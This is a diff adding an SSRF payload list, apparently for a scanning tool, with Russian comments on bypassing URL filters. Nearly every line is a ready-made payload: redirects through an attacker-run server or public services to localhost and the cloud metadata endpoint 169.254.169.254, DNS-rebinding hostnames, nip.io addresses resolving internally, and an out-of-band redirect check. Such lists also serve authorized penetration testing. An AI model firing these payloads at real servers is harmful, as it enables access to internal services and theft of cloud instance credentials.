@@ -1,0 +1,36 @@
+# redirect-rebind.txt
+# Обход фильтров через HTTP-редиректы и DNS-rebinding (режим -mode ssrf).
+# Идея: фильтр проверяет ТОЛЬКО начальный URL (видит «хороший» домен),
+# а дальше сервер сам идёт на редирект / на перепривязанный IP во внутреннюю сеть.
+# Плейсхолдеры: {{OOB}}, {{LHOST}}, {{TARGET}}
+# Строки с # и пустые игнорируются.
+
+# ---------- Свой redirect-сервер ----------
+# Подними на {{LHOST}} страницу, отдающую 302/307/308 Location: http://127.0.0.1 (или metadata).
+# 307/308 сохраняют метод и тело запроса после редиректа.
+http://{{LHOST}}/redirect?url=http://127.0.0.1
+http://{{LHOST}}/redirect?url=http://169.254.169.254/latest/meta-data/
+http://{{LHOST}}/redirect?url=http://{{TARGET}}
+
+# ---------- r3dir.me (публичный seamless-redirect сервис) ----------
+https://307.r3dir.me/--to/?url=http://localhost
+https://307.r3dir.me/--to/?url=http://127.0.0.1
+https://307.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/
+https://308.r3dir.me/--to/?url=http://{{TARGET}}
+https://302.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/
+
+# ---------- DNS rebinding (1u.ms) ----------
+# Чередует два IP между последовательными резолвами: фильтр видит внешний,
+# сервер при реальном коннекте попадает на внутренний.
+# Формат: make-A.B.C.D-rebind-E.F.G.H-rr.1u.ms
+http://make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms/latest/meta-data/
+http://make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms/
+http://make-8.8.8.8-rebind-127.0.0.1-rr.1u.ms/
+
+# ---------- nip.io / sslip.io как «легальный» внешний домен, резолвящийся внутрь ----------
+http://169.254.169.254.nip.io/latest/meta-data/
+http://127.0.0.1.nip.io/
+http://{{TARGET}}.nip.io/
+
+# ---------- OOB-редирект для проверки, идёт ли сервер по Location ----------
+http://{{OOB}}/redirect-check
